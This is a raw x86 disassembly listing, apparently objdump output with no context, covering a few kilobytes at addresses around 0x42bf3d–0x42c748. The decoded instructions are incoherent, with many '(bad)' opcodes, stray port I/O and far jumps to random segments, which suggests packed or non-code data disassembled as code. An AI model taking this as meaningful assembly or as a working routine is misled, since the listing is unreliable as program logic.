  42bf3d:	loopne 0x42bee9
  42bf3f:	mov    eax,0xc3c5f5ce
  42bf44:	in     eax,dx
  42bf45:	rol    esi,cl
  42bf47:	aad    0xe7
  42bf49:	mov    ch,0xf0
  42bf4b:	aam    0xdb
  42bf4d:	xlat   BYTE PTR ds:[ebx]
  42bf4e:	loopne 0x42bf2d
  42bf50:	cli    
  42bf51:	(bad)  
  42bf53:	repz repnz stc 
  42bf56:	(bad)  
  42bf57:	fdivr  st,st(4)
  42bf59:	pmullw mm0,QWORD PTR [ebx]
  42bf5c:	add    ecx,edx
  42bf5e:	stos   BYTE PTR es:[edi],al
  42bf5f:	xlat   BYTE PTR ds:[ebx]
  42bf60:	test   eax,0xceaae4c2
  42bf65:	aad    0xf0
  42bf67:	mov    ah,0xce
  42bf69:	iret   
  42bf6a:	sti    
  42bf6b:	(bad)  
  42bf6c:	cld    
  42bf6d:	rcl    edx,cl
  42bf6f:	cmc    
  42bf70:	std    
  42bf71:	fcmovu st,st(3)
  42bf73:	push   es
  42bf74:	retf   
  42bf75:	ror    BYTE PTR [ecx],1
  42bf77:	aam    0xe7
  42bf79:	add    esi,edi
  42bf7b:	fcmovnb st,st(4)
  42bf7d:	iret   
  42bf7e:	stos   BYTE PTR es:[edi],al
  42bf7f:	(bad)
  42bf83:	loop   0x42bf71
  42bf85:	(bad)  
  42bf87:	lock leave 
  42bf89:	shr    edi,1
  42bf8b:	iret   
  42bf8c:	jmp    0x822b982
  42bf91:	add    DWORD PTR [edi-0x1ff0f2a],edi
  42bf97:	in     eax,0xe0
  42bf99:	out    dx,eax
  42bf9a:	aam    0xce
  42bf9c:	clc    
  42bf9d:	out    0xf2,al
  42bf9f:	rol    cl,cl
  42bfa1:	jmp    0xe3047c9c
  42bfa6:	(bad)  
  42bfa7:	fnstenv [edi-0xf0a2141]
  42bfad:	mov    eax,0xf6dbd1be
  42bfb2:	(bad)  
  42bfb4:	cld    
  42bfb5:	std    
  42bfb6:	aam    0xe4
  42bfb8:	stc    
  42bfb9:	add    edx,ebx
  42bfbb:	out    0xe0,al
  42bfbd:	jecxz  0x42bfaf
  42bfbf:	mov    cl,0xc0
  42bfc1:	mov    esp,0xd0e5d5c4
  42bfc7:	int3   
  42bfc8:	imul   dh
  42bfca:	xlat   BYTE PTR ds:[ebx]
  42bfcb:	mov    eax,0xcdf201fd
  42bfd0:	cli    
  42bfd1:	fdiv   st(0),st
  42bfd3:	fadd   st(5),st
  42bfd5:	xlat   BYTE PTR ds:[ebx]
  42bfd6:	icebp  
  42bfd7:	cld    
  42bfd8:	in     al,0xd6
  42bfda:	loope  0x42bfc0
  42bfdc:	cli    
  42bfdd:	icebp  
  42bfde:	int    0xcf
  42bfe0:	repnz imul esi
  42bfe3:	in     al,0xc5
  42bfe5:	rcr    ecx,cl
  42bfe7:	in     eax,dx
  42bfe8:	(bad)  
  42bfe9:	fld    st(4)
  42bfeb:	int    0xf2
  42bfed:	loop   0x42bfe3
  42bfef:	ret    0xec01
  42bff2:	mov    edi,0xd5d5bde1
  42bff7:	in     al,0xf5
  42bff9:	aam    0xee
  42bffb:	push   cs
  42bffc:	add    eax,0xcaa9e4e0
  42c001:	mov    esi,0xe9c6c3b1
  42c006:	mov    ah,0xcb
  42c008:	stc    
  42c009:	out    0xc4,al
  42c00b:	mov    ecx,0xf7d6c3ef
  42c010:	repz loop 0x42c015
  42c013:	add    al,0xf5
  42c015:	mov    esp,0xfd0bfd05
  42c01a:	(bad)  
  42c01c:	adc    bh,cl
  42c01e:	into   
  42c01f:	out    dx,al
  42c020:	jecxz  0x42bfd0
  42c022:	(bad)  
  42c023:	mov    esp,0xffd4b7d3
  42c028:	call   0xf246781d
  42c02d:	call   0xd203a329
  42c032:	fcmovnb st,st(7)
  42c034:	add    al,0xfe
  42c036:	mov    edi,0x4e503eb
  42c03b:	leave  
  42c03c:	jecxz  0x42c029
  42c03e:	mov    esp,0xe1c8dca6
  42c043:	loope  0x42c00d
  42c045:	loopne 0x42c02e
  42c047:	fdiv   st,st(0)
  42c049:	repz mov bh,0xd0
  42c04c:	mov    edi,0xbccfdbee
  42c051:	in     al,dx
  42c052:	out    0xcc,eax
  42c054:	rcr    edx,1
  42c056:	rol    eax,0xdb
  42c059:	(bad)  
  42c05a:	leave  
  42c05b:	repz in eax,dx
  42c05d:	dec    bh
  42c05f:	mov    al,0xc8
  42c061:	retf   
  42c062:	aam    0xe7
  42c064:	ror    edi,0xd4
  42c067:	aad    0xd6
  42c069:	lock mov ch,0xf4
  42c06c:	fucomp st(7)
  42c06e:	jmp    0xe82fc365
  42c073:	idiv   ebx
  42c075:	ret    
  42c076:	sti    
  42c077:	jmp    0xe4e2:0xecefd5d7
  42c07e:	jecxz  0x42c06d
  42c080:	mov    cl,0xd7
  42c082:	mov    ch,0xec
  42c084:	call   0xf02baa5d
  42c089:	mov    dh,0xc8
  42c08b:	std    
  42c08c:	(bad)  
  42c08d:	mov    esi,0xded5f302
  42c092:	fld    QWORD PTR ds:0xddc40bd0
  42c098:	fdiv   st(1),st
  42c09a:	add    DWORD PTR [ebx],eax
  42c09c:	cli    
  42c09d:	stc    
  42c09e:	scas   eax,DWORD PTR es:[edi]
  42c09f:	shr    BYTE PTR [ebp-0x1d3a4a2b],cl
  42c0a5:	mov    dl,0xcd
  42c0a7:	mov    al,0xb5
  42c0a9:	fnstsw WORD PTR [edi-0x13323304]
  42c0af:	fldlg2 
  42c0b1:	add    dl,dl
  42c0b3:	or     eax,DWORD PTR [edi]
  42c0b5:	lds    eax,FWORD PTR [eax+ecx*8]
  42c0b8:	jmp    0x42c0a1
  42c0ba:	in     al,0xcb
  42c0bc:	retf   0xc6f3
  42c0bf:	in     eax,0xd0
  42c0c1:	repz out dx,al
  42c0c3:	ret    0xb4e7
  42c0c6:	xlat   BYTE PTR ds:[ebx]
  42c0c7:	neg    dl
  42c0c9:	mov    esi,0xf9f3eadc
  42c0ce:	loopne 0x42c09c
  42c0d0:	out    dx,al
  42c0d1:	aad    0xfa
  42c0d3:	repnz shl ecx,1
  42c0d6:	inc    bh
  42c0d8:	xlat   BYTE PTR ds:[ebx]
  42c0d9:	pop    es
  42c0da:	retf   
  42c0db:	(bad)  
  42c0dd:	in     al,0xbc
  42c0df:	jmp    0x42c0a8
  42c0e1:	(bad)
  42c0e4:	in     al,0xf0
  42c0e6:	rol    esi,0xf5
  42c0e9:	ror    ebx,1
  42c0eb:	(bad)  
  42c0ed:	clc    
  42c0ee:	fcmovnb st,st(0)
  42c0f0:	shl    esi,1
  42c0f2:	shr    ebx,0xfb
  42c0f5:	shl    edx,1
  42c0f7:	(bad)  
  42c0f9:	jmp    0x42c0d0
  42c0fb:	retf   0xc0ff
  42c0fe:	rcl    edi,0xe5
  42c101:	enter  0xe8e4,0xeb
  42c105:	rcl    eax,cl
  42c107:	mov    al,0xb5
  42c109:	out    dx,al
  42c10a:	in     al,0xff
  42c10c:	out    dx,eax
  42c10d:	in     al,dx
  42c10e:	sar    BYTE PTR [esp+edi*8-0x2f81c0f],cl
  42c115:	repnz in eax,0xfb
  42c118:	out    0xf4,eax
  42c11a:	jmp    0xc63fbb06
  42c11f:	jmp    0xc805a3d5
  42c124:	mov    ah,0xed
  42c126:	clc    
  42c127:	lock repz (bad) 
  42c12a:	(bad)
  42c12d:	aad    0xd9
  42c12f:	pop    es
  42c130:	repnz into 
  42c132:	add    bl,dh
  42c134:	add    bh,BYTE PTR [ebp+edx*8+0xce6efc2]
  42c13b:	or     eax,0xd8c6def8
  42c140:	test   ecx,0xefd3d7ae
  42c146:	clc    
  42c147:	aam    0xc7
  42c149:	jmp    0xc8f77b24
  42c14e:	mov    esi,0xfaf0d1c0
  42c153:	add    cl,bh
  42c155:	or     esi,ebp
  42c157:	stc    
  42c158:	cmc    
  42c159:	stc    
  42c15a:	clc    
  42c15b:	pop    es
  42c15c:	add    bl,cl
  42c15e:	out    0xd8,eax
  42c160:	mov    al,0xd2
  42c162:	mov    bl,0xb1
  42c164:	loopne 0x42c146
  42c166:	in     eax,0xdb
  42c168:	fcmovb st,st(6)
  42c16a:	xlat   BYTE PTR ds:[ebx]
  42c16b:	rcr    esi,1
  42c16d:	fcmovbe st,st(5)
  42c16f:	call   0xc63cb030
  42c174:	mov    esp,0xe9e1d8e6
  42c179:	push   cs
  42c17a:	fdivp  st(2),st
  42c17c:	or     bl,ch
  42c17e:	in     al,0xef
  42c180:	enter  0xf7cd,0xc9
  42c184:	rol    edx,cl
  42c186:	in     al,0xcb
  42c188:	mov    eax,0xf3eaf7eb
  42c18d:	sar    ebx,cl
  42c18f:	mov    dh,0xcf
  42c191:	(bad)  
  42c192:	rcr    ch,cl
  42c194:	fst    st(1)
  42c196:	loopne 0x42c15d
  42c198:	loopne 0x42c188
  42c19a:	into   
  42c19b:	fsincos 
  42c19d:	repnz lods al,BYTE PTR ds:[esi]
  42c19f:	test   esi,0xe8ecabc5
  42c1a5:	ret    0xcac1
  42c1a8:	jmp    0xbd16b561
  42c1ad:	(bad)  
  42c1af:	fxch   st(6)
  42c1b1:	hlt    
  42c1b2:	add    eax,DWORD PTR [esi]
  42c1b4:	icebp  
  42c1b5:	jecxz  0x42c19c
  42c1b7:	retf   0xc00a
  42c1ba:	fdivp  st(5),st
  42c1bc:	call   0xc40c85bb
  42c1c1:	out    0xe6,al
  42c1c3:	loopne 0x42c1ad
  42c1c5:	mov    bl,0xb3
  42c1c7:	out    dx,eax
  42c1c8:	(bad)  
  42c1ca:	retf   
  42c1cb:	rcl    ah,1
  42c1cd:	retf   0x2ed
  42c1d0:	add    ecx,esp
  42c1d2:	ret    
  42c1d3:	stc    
  42c1d4:	add    ch,al
  42c1d6:	std    
  42c1d7:	(bad)  
  42c1d8:	rol    DWORD PTR [ecx],0x9
  42c1db:	or     al,0xdb
  42c1dd:	repz test eax,0xd0f1e8eb
  42c1e3:	scas   al,BYTE PTR es:[edi]
  42c1e4:	in     eax,dx
  42c1e5:	mul    esi
  42c1e7:	sar    DWORD PTR [eax-0x4b00341b],1
  42c1ed:	add    ecx,edi
  42c1ef:	add    edi,edx
  42c1f1:	fdecstp 
  42c1f3:	stc    
  42c1f4:	fimul  DWORD PTR [ecx]
  42c1f6:	fld    st(4)
  42c1f8:	(bad)  
  42c1fa:	cld    
  42c1fb:	fisttp QWORD PTR [ebx]
  42c1fd:	add    bl,ah
  42c1ff:	shr    edi,0xdd
  42c202:	enter  0xd0ca,0xc2
  42c206:	jmp    0xb71abaeb
  42c20b:	lock jmp 0xfce2:0xfad6fed8
  42c213:	loopne 0x42c216
  42c215:	sti    
  42c216:	fucomi st,st(2)
  42c218:	enter  0xf5c6,0xfd
  42c21c:	or     ch,ch
  42c21e:	lods   al,BYTE PTR ds:[esi]
  42c21f:	int    0xce
  42c221:	lods   al,BYTE PTR ds:[esi]
  42c222:	retf   0xd3c1
  42c225:	call   0xd63286dd
  42c22a:	sti    
  42c22b:	sti    
  42c22c:	ret    
  42c22d:	mov    edi,0xd1d1fddb
  42c232:	aam    0xc5
  42c234:	repnz sti 
  42c236:	hlt    
  42c237:	add    esi,esp
  42c239:	hlt    
  42c23a:	loopne 0x42c226
  42c23c:	fsub   st(5),st
  42c23e:	loop   0x42c20f
  42c240:	mov    edi,0xcccce3ea
  42c245:	into   
  42c246:	retf   
  42c247:	in     eax,dx
  42c248:	mov    cl,0xb8
  42c24a:	call   0xbf12af01
  42c24f:	hlt    
  42c250:	mov    ch,0xf5
  42c252:	(bad)  
  42c253:	repnz add ebp,edx
  42c256:	fst    st(0)
  42c258:	jmp    0xe92d9243
  42c25d:	clc    
  42c25e:	les    ebp,FWORD PTR [edx-0x9503f49]
  42c264:	mov    dh,0xd5
  42c266:	icebp  
  42c267:	out    0xf5,eax
  42c269:	mov    esi,0xbbd9c9bf
  42c26e:	ror    eax,cl
  42c270:	rcr    bh,1
  42c272:	push   es
  42c273:	in     al,dx
  42c274:	icebp  
  42c275:	add    bl,cl
  42c277:	push   es
  42c278:	add    DWORD PTR [edi],ecx
  42c27a:	leave  
  42c27b:	in     eax,dx
  42c27c:	out    dx,al
  42c27d:	repz ror esp,1
  42c280:	in     eax,dx
  42c281:	in     al,0xe5
  42c283:	loope  0x42c24f
  42c285:	loop   0x42c272
  42c287:	inc    esp
  42c289:	lods   al,BYTE PTR ds:[esi]
  42c28a:	mov    ebx,0xccb9fed5
  42c28f:	(bad)  
  42c291:	stc    
  42c292:	xlat   BYTE PTR ds:[ebx]
  42c293:	xlat   BYTE PTR ds:[ebx]
  42c294:	push   ebp
  42c296:	fcomp  st(0)
  42c298:	add    dh,dh
  42c29a:	inc    DWORD PTR [eax]
  42c29c:	jmp    0xe73ab4a4
  42c2a1:	icebp  
  42c2a2:	lds    esi,FWORD PTR [edx-0x4432161e]
  42c2a8:	call   0xf919be99
  42c2ad:	jecxz  0x42c2ae
  42c2af:	jecxz  0x42c26e
  42c2b1:	pop    es
  42c2b2:	mov    ebp,0x5ffd7c6
  42c2b7:	dec    BYTE PTR [ecx]
  42c2b9:	retf   0xc5e7
  42c2bc:	fmul   st(5),st
  42c2be:	ror    cl,1
  42c2c0:	int    0xea
  42c2c2:	jmp    0xd5c8:0xc0d1cce8
  42c2c9:	mov    bh,0xf0
  42c2cb:	rcr    ebx,cl
  42c2cd:	(bad)  
  42c2ce:	fucomi st,st(5)
  42c2d0:	repz neg esi
  42c2d3:	pop    es
  42c2d4:	sti    
  42c2d5:	or     dl,ah
  42c2d7:	jmp    0xccec:0xecc7c9ef
  42c2de:	rol    ebx,cl
  42c2e0:	lock mov dh,0xe1
  42c2e3:	ror    esi,cl
  42c2e5:	div    BYTE PTR [edx-0x2904044b]
  42c2eb:	stc    
  42c2ec:	rcr    ebx,1
  42c2ee:	jmp    0xce3eb0e6
  42c2f3:	fadd   DWORD PTR ds:0xe3cae1d5
  42c2f9:	retf   0xd804
  42c2fc:	in     eax,0xd
  42c2fe:	fdivr  st(0),st
  42c300:	mov    bl,0xea
  42c302:	shl    ebx,cl
  42c304:	lods   al,BYTE PTR ds:[esi]
  42c305:	lock ror ebp,1
  42c308:	(bad)  
  42c309:	sti    
  42c30a:	leave  
  42c30b:	jmp    0x42c2f8
  42c30d:	jmp    0xdff4:0xd9bdbacf
  42c314:	(bad)  
  42c316:	or     ecx,DWORD PTR [edi]
  42c318:	call   0x62aa025
  42c31d:	fcomip st,st(1)
  42c31f:	mov    ebp,0xe7bcf7e8
  42c324:	cli    
  42c325:	lock out 0xd7,al
  42c328:	in     eax,0xeb
  42c32a:	leave  
  42c32b:	sar    DWORD PTR [esi-0x3c49232c],cl
  42c331:	mov    ebp,0xded9d9f3
  42c336:	or     bl,al
  42c338:	add    edi,ebp
  42c33a:	fisttp QWORD PTR [edx]
  42c33c:	repnz fsubr st,st(3)
  42c33f:	out    dx,al
  42c340:	out    dx,al
  42c341:	lods   eax,DWORD PTR ds:[esi]
  42c342:	repnz mov bh,0xc9
  42c345:	mov    cl,0xd2
  42c347:	in     eax,dx
  42c348:	into   
  42c349:	(bad)  
  42c34a:	fnstcw WORD PTR [edi+0x7baead3]
  42c350:	sti    
  42c351:	in     al,dx
  42c352:	int3   
  42c353:	mov    esi,0xfbd8fcf2
  42c358:	retf   
  42c359:	iret   
  42c35a:	fcmovnb st,st(4)
  42c35c:	int    0xcf
  42c35e:	ror    ebp,0xe6
  42c361:	lods   eax,DWORD PTR ds:[esi]
  42c362:	out    0xb5,al
  42c364:	mov    bh,0xe7
  42c366:	sti    
  42c367:	mov    edx,0x3faebd1
  42c36c:	std    
  42c36d:	fyl2x  
  42c36f:	out    0xd6,eax
  42c371:	aad    0xe1
  42c373:	mov    cl,0x3
  42c376:	cmc    
  42c377:	push   es
  42c378:	mov    DWORD PTR ds:0x1207f3dd,0xe7deb2e7
  42c382:	mov    ebp,0xd1c7e3c5
  42c387:	mov    ebx,0xead6d1fe
  42c38c:	ror    ecx,1
  42c38e:	repnz mov dh,0xd5
  42c391:	cli    
  42c392:	add    DWORD PTR [esi-0x192a063d],edi
  42c398:	loope  0x42c390
  42c39a:	in     eax,0x9
  42c39c:	in     eax,dx
  42c39d:	fucomp st(3)
  42c39f:	loope  0x42c38a
  42c3a1:	cmc    
  42c3a2:	cmc    
  42c3a3:	out    0xb6,al
  42c3a5:	into   
  42c3a6:	aam    0xcf
  42c3a8:	jmp    0xb7bb:0xd6edfdde
  42c3af:	loopne 0x42c373
  42c3b1:	hlt    
  42c3b2:	fadd   DWORD PTR [eax]
  42c3b4:	lock out 0x9,eax
  42c3b7:	(bad)  
  42c3b9:	fadd   DWORD PTR [esi]
  42c3bb:	retf   0xcdc5
  42c3be:	out    dx,eax
  42c3bf:	into   
  42c3c0:	iret   
  42c3c1:	shr    BYTE PTR [ebp-0x4090952],1
  42c3c7:	fxch   st(0)
  42c3c9:	fsubp  st(4),st
  42c3cb:	mov    edi,0xd403b903
  42c3d0:	lock rcr ch,0xf7
  42c3d4:	(bad)  
  42c3d5:	std    
  42c3d6:	add    eax,0xf9e1d5fc
  42c3db:	or     DWORD PTR ds:0xc8eddc0e,ecx
  42c3e1:	lock call 0xd21386bc
  42c3e7:	mov    edx,0xf4d8b7c7
  42c3ec:	icebp  
  42c3ed:	(bad)  
  42c3ef:	(bad)  
  42c3f0:	shl    edi,cl
  42c3f2:	(bad)  
  42c3f3:	mov    esi,0x9c5d5de
  42c3f8:	cli    
  42c3f9:	cmc    
  42c3fa:	loope  0x42c3ea
  42c3fc:	call   0xc925a1de
  42c401:	rcr    ch,1
  42c403:	in     eax,0xb7
  42c405:	jmp    0xaaac1
  42c40a:	mov    ebp,0xe801fbbb
  42c40f:	mov    dh,0xcf
  42c411:	aad    0xfb
  42c413:	(bad)
  42c416:	(bad)  
  42c418:	call   0x50c9e3
  42c41d:	cli    
  42c41e:	mov    bl,0xbf
  42c420:	out    dx,al
  42c421:	lods   al,BYTE PTR ds:[esi]
  42c422:	not    cl
  42c424:	mov    cl,0xb3
  42c426:	repz iret 
  42c428:	in     al,0xb0
  42c42a:	fcmove st,st(1)
  42c42c:	mov    edx,0xf6d7d1f5
  42c431:	shl    al,cl
  42c433:	lock cli 
  42c435:	push   es
  42c436:	aad    0xe4
  42c438:	aad    0xe5
  42c43a:	jecxz  0x42c448
  42c43c:	ffree  st(4)
  42c43e:	iret   
  42c43f:	mul    ebp
  42c441:	loope  0x42c42c
  42c443:	(bad)  
  42c444:	repz aam 0xfb
  42c447:	mov    ch,0xf3
  42c449:	in     al,0xd7
  42c44b:	(bad)  
  42c44d:	fdivr  st,st(1)
  42c44f:	(bad)  
  42c450:	cld    
  42c451:	repz mov esp,0xf1deda02
  42c457:	les    ecx,FWORD PTR [edx]
  42c459:	retf   
  42c45a:	add    ecx,DWORD PTR ds:0xb0c00d01
  42c460:	lock aad 0xeb
  42c463:	mul    al
  42c465:	vpand  xmm3,xmm7,xmm2
  42c469:	enter  0xcefb,0xf8
  42c46d:	mov    ah,0xc9
  42c46f:	jecxz  0x42c430
  42c471:	div    ebx
  42c473:	vpmaxub ymm5,ymm0,ymm3
  42c477:	fsubr  st,st(1)
  42c479:	sti    
  42c47a:	out    0xcb,al
  42c47c:	adc    bl,dl
  42c47e:	rol    dl,1
  42c480:	ret    0xf0a8
  42c483:	iret   
  42c484:	jmp    0x42c43b
  42c486:	stc    
  42c487:	mov    bh,0xb8
  42c489:	mov    dh,0xbf
  42c48b:	(bad)  
  42c48c:	fcom   st(3)
  42c48e:	fcmovbe st,st(5)
  42c490:	icebp  
  42c491:	jecxz  0x42c477
  42c493:	mul    ebp
  42c495:	rol    ebx,1
  42c497:	clc    
  42c498:	fucomp st(5)
  42c49a:	fiadd  WORD PTR [ecx]
  42c49c:	fsubrp st(3),st
  42c49e:	into   
  42c49f:	scas   eax,DWORD PTR es:[edi]
  42c4a0:	fsubrp st(6),st
  42c4a2:	scas   eax,DWORD PTR es:[edi]
  42c4a3:	aam    0xca
  42c4a5:	jmp    0xf312b38f
  42c4aa:	iret   
  42c4ab:	(bad)  
  42c4ad:	mov    esp,0xb4d5f3ba
  42c4b2:	fstp   st(7)
  42c4b4:	ret    0xeadc
  42c4b7:	std    
  42c4b8:	out    0xfe,eax
  42c4ba:	fsubr  st(7),st
  42c4bc:	rcl    DWORD PTR [edx],0xbe
  42c4bf:	shl    BYTE PTR [ebp-0xe1f4309],0xf3
  42c4c6:	sti    
  42c4c7:	int3   
  42c4c8:	rcl    esp,cl
  42c4ca:	test   esi,0xc0d5ccd4
  42c4d0:	(bad)  
  42c4d1:	loope  0x42c4b3
  42c4d3:	hlt    
  42c4d4:	div    bh
  42c4d6:	loope  0x42c4d3
  42c4d8:	loope  0x42c4df
  42c4da:	loopne 0x42c4e5
  42c4dc:	(bad)  
  42c4dd:	out    0xd2,al
  42c4df:	fdivrp st(7),st
  42c4e1:	test   al,0xd2
  42c4e3:	stos   BYTE PTR es:[edi],al
  42c4e4:	shl    BYTE PTR [ebp-0x1612312e],1
  42c4ea:	(bad)
  42c4ed:	(bad)  
  42c4ee:	mov    ecx,0x3dcf5fa
  42c4f3:	lds    eax,FWORD PTR ds:0xd7dbfec4
  42c4f9:	fsubrp st(0),st
  42c4fb:	push   cs
  42c4fc:	fxch   st(3)
  42c4fe:	fcom   st(3)
  42c500:	mov    edi,0xd3d5ddac
  42c505:	out    0xfa,al
  42c507:	retf   0xfdcf
  42c50a:	cmc    
  42c50b:	mov    edx,0xcdbdfce3
  42c510:	(bad)  
  42c511:	int    0xf7
  42c513:	xlat   BYTE PTR ds:[ebx]
  42c514:	fcmovnu st,st(1)
  42c516:	(bad)  
  42c517:	fadd   DWORD PTR [esp+edi*8]
  42c51a:	dec    BYTE PTR ds:0xe5e4eceb
  42c520:	out    0xa4,al
  42c522:	repz loop 0x42c4fb
  42c525:	fucompp 
  42c527:	(bad)  
  42c528:	fdivr  st,st(0)
  42c52a:	mov    ch,0xbe
  42c52c:	leave  
  42c52d:	mov    ah,0xdc
  42c52f:	(bad)  
  42c530:	(bad)  
  42c532:	(bad)  
  42c533:	rcl    ebx,cl
  42c535:	std    
  42c536:	add    eax,0xfdfbc8fb
  42c53b:	in     al,0x2
  42c53d:	jmp    0xeeb5:0xc8c8c1f3
  42c544:	out    0xb1,al
  42c546:	shl    BYTE PTR [edx-0x1024a2b],cl
  42c54c:	sar    BYTE PTR [ebp+0x7ced0b8],cl
  42c552:	fisttp QWORD PTR [ebx]
  42c554:	mov    ecx,0xe005f1e2
  42c559:	inc    ebx
  42c55b:	leave  
  42c55c:	(bad)  
  42c55e:	int    0xef
  42c560:	int3   
  42c561:	loope  0x42c531
  42c563:	into   
  42c564:	retf   
  42c565:	repz out dx,al
  42c567:	ror    ebx,cl
  42c569:	mov    dh,0xc8
  42c56b:	mov    ch,0xfa
  42c56d:	call   0xc7159a5b
  42c572:	cli    
  42c573:	(bad)  
  42c574:	stc    
  42c575:	fadd   DWORD PTR [ecx]
  42c577:	jmp    0x2b9178
  42c57c:	or     esi,ecx
  42c57e:	jmp    0x42c550
  42c580:	int3   
  42c581:	mov    dh,0xee
  42c583:	cmc    
  42c584:	mov    dl,0xfa
  42c586:	jmp    0xe91caa86
  42c58b:	add    ebp,esp
  42c58d:	add    DWORD PTR [esi-0x2e22fe0e],edi
  42c593:	idiv   ecx
  42c595:	sar    edx,1
  42c597:	push   es
  42c598:	std    
  42c599:	call   0xa0e909a
  42c59e:	fldcw  WORD PTR [edx-0x3a0d0e1e]
  42c5a4:	(bad)  
  42c5a5:	out    dx,al
  42c5a6:	int    0xc4
  42c5a8:	cmc    
  42c5a9:	sar    BYTE PTR [ecx-0x2240211],cl
  42c5af:	mov    ebp,0xe1d2d5fb
  42c5b4:	cld    
  42c5b5:	add    ebx,ebx
  42c5b7:	fdivp  st(2),st
  42c5b9:	out    0xcd,eax
  42c5bb:	fxch   st(2)
  42c5bd:	jmp    0x42c59f
  42c5bf:	in     al,dx
  42c5c0:	fsubp  st(7),st
  42c5c2:	jecxz  0x42c5af
  42c5c4:	leave  
  42c5c5:	mov    ah,0xf0
  42c5c7:	mov    bh,0xd0
  42c5c9:	retf   0xcecc
  42c5cc:	fcomp  st(2)
  42c5ce:	(bad)  
  42c5d0:	out    0x1,al
  42c5d2:	cld    
  42c5d3:	aam    0xc4
  42c5d5:	rcr    ch,0x7
  42c5d8:	or     al,dh
  42c5da:	int    0xcc
  42c5dc:	loopne 0x42c5cf
  42c5de:	(bad)  
  42c5df:	shr    al,cl
  42c5e1:	mov    cl,0xeb
  42c5e3:	iret   
  42c5e4:	cli    
  42c5e5:	ret    0xf3f0
  42c5e8:	fcmovb st,st(4)
  42c5ea:	repz int3 
  42c5ec:	stc    
  42c5ed:	int    0xd9
  42c5ef:	(bad)  
  42c5f0:	cli    
  42c5f1:	out    0xc3,eax
  42c5f3:	pop    es
  42c5f4:	lock ror BYTE PTR [ebx],1
  42c5f7:	add    bh,bh
  42c5f9:	in     eax,0xe9
  42c5fb:	leave  
  42c5fc:	retf   
  42c5fd:	rcl    eax,cl
  42c5ff:	jmp    0xb6d0:0xf7e2acc5
  42c606:	fcmovnu st,st(1)
  42c608:	xlat   BYTE PTR ds:[ebx]
  42c609:	fidivr DWORD PTR [ebp-0x43302b2d]
  42c60f:	aad    0xf2
  42c611:	add    al,BYTE PTR [ebx]
  42c613:	cld    
  42c614:	aam    0xf4
  42c616:	retf   0x6be
  42c619:	jmp    0x42c5f6
  42c61b:	or     ebx,edx
  42c61d:	or     edx,ecx
  42c61f:	call   0xb5f28cf3
  42c624:	xlat   BYTE PTR ds:[ebx]
  42c625:	mov    ah,0xb5
  42c627:	int3   
  42c628:	jmp    0xfe:0xecc8f6d2
  42c62f:	(bad)  
  42c631:	mov    eax,0xcaf3c306
  42c636:	in     eax,0xd9
  42c638:	cld    
  42c639:	out    0xe7,eax
  42c63b:	add    esp,ecx
  42c63d:	pop    es
  42c63e:	jmp    0x42c607
  42c640:	(bad)  
  42c641:	loope  0x42c620
  42c643:	(bad)  
  42c644:	lock out dx,eax
  42c646:	mov    cl,0xd1
  42c648:	in     al,0xef
  42c64a:	leave  
  42c64b:	ror    eax,1
  42c64d:	in     al,dx
  42c64e:	iret   
  42c64f:	ret    
  42c650:	add    bl,bh
  42c652:	out    0x4,eax
  42c654:	lock pop es
  42c656:	(bad)  
  42c657:	retf   
  42c658:	fst    st(4)
  42c65a:	add    eax,0xf2e903da
  42c65f:	mov    esp,0xeac7caf3
  42c665:	lods   al,BYTE PTR ds:[esi]
  42c666:	(bad)
  42c669:	(bad)  
  42c66a:	(bad)  
  42c66b:	int3   
  42c66c:	aad    0xdc
  42c66e:	xlat   BYTE PTR ds:[ebx]
  42c66f:	repnz test edi,0x4feccf7
  42c676:	(bad)
  42c679:	test   BYTE PTR [ebx],0xc9
  42c67c:	(bad)  
  42c67e:	mov    eax,0xd3ebc0de
  42c683:	jmp    0x42c677
  42c685:	div    dh
  42c687:	call   ecx
  42c689:	lock out dx,al
  42c68b:	jmp    0xf1fb:0xf0fadfd8
  42c692:	ffreep st(6)
  42c694:	cmc    
  42c695:	icebp  
  42c696:	or     DWORD PTR [edx],ecx
  42c698:	clc    
  42c699:	out    0xdb,eax
  42c69b:	retf   0xe50e
  42c69e:	call   0xc919a968
  42c6a3:	enter  0xc5b7,0xb2
  42c6a7:	jmp    0xbac8:0xbdcdfaf1
  42c6ae:	add    BYTE PTR [eax-0x3c1a0b24],bh
  42c6b4:	loope  0x42c6ba
  42c6b6:	jmp    0x42c6be
  42c6b8:	sti    
  42c6b9:	test   BYTE PTR [edi],0xeb
  42c6bc:	lds    eax,FWORD PTR [edi]
  42c6be:	mov    dl,0xd2
  42c6c0:	retf   
  42c6c1:	fidiv  WORD PTR [ebp-0x260a1512]
  42c6c7:	shl    esi,cl
  42c6c9:	imul   bh
  42c6cb:	into   
  42c6cc:	cmc    
  42c6cd:	repz rcr ecx,1
  42c6d0:	jecxz  0x42c6cb
  42c6d2:	aam    0xf5
  42c6d4:	or     al,BYTE PTR ds:0xc5eed5d6
  42c6da:	or     al,0xcd
  42c6dc:	add    BYTE PTR [ebx],cl
  42c6de:	out    dx,al
  42c6df:	xlat   BYTE PTR ds:[ebx]
  42c6e0:	ret    0xc5e1
  42c6e3:	loop   0x42c6e0
  42c6e5:	in     al,dx
  42c6e6:	icebp  
  42c6e7:	lock stc 
  42c6e9:	dec    edx
  42c6eb:	xlat   BYTE PTR ds:[ebx]
  42c6ec:	aam    0xb8
  42c6ee:	call   0xc62486c2
  42c6f3:	ret    0x1c5
  42c6f6:	stc    
  42c6f7:	mov    esi,0xccc60bc0
  42c6fc:	fcmovne st,st(0)
  42c6fe:	ror    ebx,0xc8
  42c701:	rcl    ebp,cl
  42c703:	jmp    0x42c6e0
  42c705:	enter  0xb6e0,0xcc
  42c709:	mov    al,0xcd
  42c70b:	aam    0xda
  42c70d:	(bad)  
  42c70e:	mov    edi,0xc7d0b8ed
  42c713:	out    0xe1,al
  42c715:	retf   
  42c716:	(bad)  
  42c718:	out    dx,al
  42c719:	loop   0x42c70a
  42c71b:	in     al,0xb
  42c71d:	in     al,dx
  42c71e:	repnz out 0xc7,eax
  42c721:	lods   al,BYTE PTR ds:[esi]
  42c722:	int    0xf1
  42c724:	rol    cl,1
  42c726:	leave  
  42c727:	not    edi
  42c729:	leave  
  42c72a:	fdiv   DWORD PTR [edx-0xb2f2b41]
  42c730:	add    ebp,esi
  42c732:	(bad)  
  42c733:	mov    edx,0x2d8d1e7
  42c738:	aam    0xde
  42c73a:	(bad)  
  42c73b:	call   0xcd04b109
  42c740:	mov    esp,0xfbc9c5f6
  42c745:	loop   0x42c739
  42c747:	retf   
  42c748:	fisubr WORD PTR [ebp+ebx*8-0x412b054c]
